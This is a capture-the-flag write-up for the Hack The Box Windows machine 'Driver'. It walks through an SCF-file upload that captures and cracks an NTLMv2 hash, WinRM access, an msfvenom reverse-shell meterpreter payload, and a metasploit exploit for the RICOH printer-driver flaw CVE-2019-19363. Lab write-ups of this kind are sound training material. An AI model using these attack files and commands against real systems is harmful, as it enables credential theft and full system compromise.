---
tags:
  - Windows
  - HTTP
  - Insecure File Upload
  - CVE
---

... is a easy HTB machine which allows you to upload files via an `http` service which then (presumably) get rendered by `Windows File Explorer`. A file which instantly executes when rendered by `File Explorer` can be uploaded (`SCF`) to fetch and crack the `NTLMv2` hash of a user which has `winrm` capabilities. For the privilege escalation, a `CVE` can be exploited via `metasploit`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```
I will shortly explain the open ports below:

- Port `80`: Web-service reachable via a browser.
- Port `139` and `445`: Usually both indicate `SMB`. Port `139` relies on legacy `NetBIOS` (support for older machines), port `445` is a newer version using `TCP/IP`. `SMB` is highly interesting for exploitation, as it allows access to files / printers over the network.
- Port `5985`: Port for `WinRM`. Comparable to `ssh`, usually exclusive to Windows. Interesting if credentials are found.

The output of the `http-auth` script of `nmap` shows me that a login prompt is being displayed for the user `admin`.

But before investigating the `http` service, i'd like to know if there are any secrets hidden in the `smb` shares. I issue this `netexec` command to list all shares as the `Guest` account:
```bash
nxc smb $IP -u 'a' -p '' --shares
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: the username to use. can be anything, as it defaults to the user 'Guest', if the name is not found.
# -p: the password to use. empty here
# --shares: a flag which tells nxc to return a list of available shares.
```

Sadly though, `Null Auth` or `Guest Access` is not allowed on this `smb` service.

That is why i opened `burpsuite` to investigate the `http` service on the web-site `http://$IP`. As expected, i instantly receive a prompt to log in. As i know that `admin` must be the username from the `nmap script`, i try to authenticate using weak passwords such as `admin`, `password`, `password123` and so on.

Funnily enough, `admin` works for the password. The login-restricted content shows a page for `MFP Firmware Update Center`, and it offers the following endpoints reachable via buttons:

- `/index.php`: Shows a picture of a printer with some text.
- `/fw_up.php`: Allows me to upload a firmware update for a printer to the file share (probably `smb`), which is then reviewed by the testing team.

### Initial Exploitation
This `/fw_up.php` endpoint seems very interesting to interact with, as those firmware update files usually come in the `.exe` format. I test this functionality by uploading a `test.txt` without any content. Nothing reveals itself though through `burpsuite`, i just get redirected to `/fw_up.php?msg=SUCCESS`.

The upload page states that the testing team will review the uploaded files manually and the file lands in a file share. Knowing this, i googled how a `smb` share can be viewed or shown and there are three options: `File Explorer`, `Powershell` and `Command Prompt`. The page explicitly said that the testing team `"initiates the testing soon."`, which means they are probably not executed by them (`powershell` or `cmd` scripts won't work).

So i googled `malicious file file explorer` and i have found [this blog](https://coesecurity.com/file-explorer-under-attack/). It talks about a `FileFix` attack where a malicious `SCF` (`Shell Command File`) is viewed in a Windows `File Explorer`. These files are automatically executed by `File Explorer` when viewed. They are usually used to execute simple commands such as showing the desktop or opening the explorer. 

The vulnerability in them exists, when a `UNC` (`Universal Naming Convention`) path is specified which leads to an external resource. It will automatically try to fetch the remote resource via an `SMB` connection, where `responder` may be waiting to ask for `NTLMv2` hashes which can be cracked to receive clear-text passwords!

To achieve this, the following `evil.scf` file specifies a resource on my local machine:
```powershell
[Shell]  
Command=2  
IconFile=\\<my-IP>\test
```
Before uploading this file, i start `responder`, so it responds to this `SMB` connection with a `challenge-response` to fetch the `NTLMv2` hash:
```bash
sudo responder -I tun0
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -I: specify interface. here tun0, as that is the interface of the VPN
```

After uploading it i instantly receive the `NetNTLMv2` hash for the user `tony`, which i save in a `hash.txt` file. I can then crack it using `hashcat` without specifying a `mode`, as it gets automatically detected:
```bash
hashcat ./hash.txt ./rockyou.txt
```
`tony's` password is revealed to be `liltony`!

Using `tony:liltony` i could enumerate the `smb` shares which he can view, but i always try to get a `winrm` session first, to see if that user is allowed to do so:
```bash
evil-winrm -i $IP -u tony -p liltony
```
It took a while, which made me think that it did not work, but after a short wait, i do receive a `PowerShell` connection of the user `tony`, which eliminates the need for `Lateral Movement`!

### Privilege Escalation
With windows machines, i always enumerate the current user's privileges using `whoami /all`, but nothing out of the ordinary stands out. I also try to read the `powershell history` file using this command:
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
And i do receive the `PowerShell` history of `tony`! It tells me the following information:
```powershell
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```
As i did not know much about the `RICOH PCL6 UniversalDriver V4.23` printer driver, i googled for vulnerabilities in it. That revealed `CVE-2019-19363`. The vulnerability exists in insecure file permissions in the installation directory, where arbitrary users on the system can write a `DLL` in the installation directory. The process `PrintIsolationHost.exe` then loads all of the `DLL`'s in that directory and executes them with `SYSTEM` privileges (highest possible privilege).

The folder which holds the `DLL's` is (all of these folders are hidden, find them with `ls -force` or `dir -force`):
```powershell
C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz
```
I `cd` into that directory and investigate if i truly have write permissions to the `DLL` folder using `icacls ./`, and the output says `Everyone`!

The full `POC` is a bit complicated, as it requires a race condition when the target `DLL` is written, so that folder needs to be constantly monitored. More info about that can be found [here](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/). Luckily enough, this `PoC` is included in `metasploit` as a module called `exploit/windows/local/ricoh_driver_privesc`! 

This module requires an existing `meterpreter` session, so i create a `meterpreter.exe` as follows:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<my-IP> LPORT=4444 -f exe > meterpreter.exe
```
I can upload this file onto the target using the `evil-winrm` command `upload meterpreter.exe ./`. But before i execute this, i need to start `metasploit's` handler for incoming `meterpreter` sessions. The workflow of that looks like this:

1. `msfconsole`: starts `metasploit's` console
2. `use exploit/multi/handler`: uses the `meterpreter` handler
3. `set payload windows/x64/meterpreter/reverse_tcp`: changes the handled payload to windows `meterpreter` (which i generated)
4. `set LHOST tun0`: set the listening IP to my `tun0` interface (`HTB VPN`) 
5. `run`: start listening

Executing the `./meterpreter.exe` which i have downloaded on the target, gives me a `meterpreter` session!

I can issue the command `background` to get back to the `metasploit` console, as i want to use the `ricoh_driver_privesc` module. It would then look like this:

1. `use exploit/windows/local/ricoh_driver_privesc`: uses the privilege escalation module
2. `set payload windows/x64/meterpreter/reverse_tcp`: use this payload instead (the default one is not `x64`!)
3. `set SESSION 1`: use the currently `background`-ed `meterpreter` session
4. `set LHOST tun0`: set the listening IP to my `tun0` interface (`HTB VPN`) 
5. `run`: run the privilege escalation

This did not work somehow. I remembered that my `meterpreter` session was started from a `winrm` session. After some research i found out that `winrm` is a `service host process`, which means it has no `GUI`, meaning it is not a real interactive session of an actual user, limiting its capabilities. I go back into my session using `sessions -i 1` and issue the `ps` command. I notice that the `meterpreter.exe` call is not an interactive session `ID=0`, just as expected.

I can use the `migrate` command of the `meterpreter` to jump to another process which may have a interactive GUI session! I quickly notice a `cmd.exe` process running, so i use `migrate <its-PID>`, and it worked. After `background-ing` this `meterpreter`, i `run` the `privesc` again and with success this time! A `meterpreter` session 2 has opened as `NT AUTHORITY\SYSTEM` (highest possible privilege)!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|File<br>upload| B[SCF<br>file];
  B -->|SMB<br>coercion| C[NTLMv2<br>hash];
  C -->|Hash<br>cracking| D[WinRM<br>access];
```

The privilege escalation to the user `SYSTEM` worked as follows:

``` mermaid
graph LR
  A[WinRM<br>access] -->|write| B[Printer-driver<br>directory];
  B -->|DLL<br>hijacking| C[Command<br>execution<br>as SYSTEM];
```